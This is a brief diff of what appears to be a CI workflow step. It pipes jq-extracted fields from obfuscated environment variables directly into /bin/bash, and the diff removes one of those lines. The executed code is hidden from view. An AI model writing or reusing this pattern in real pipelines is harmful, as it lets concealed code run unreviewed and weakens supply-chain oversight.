@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$s366" | jq -r .cxbig32 | /bin/bash
           printf '%s' "$ovdkb67740" | jq -r .wqkak1349 | /bin/bash
-          printf '%s' "$fgep2274" | jq -r .eah2255 | /bin/bash
           echo $a75 | jq -r .nqg905 | /bin/bash
 
       - name: Save data
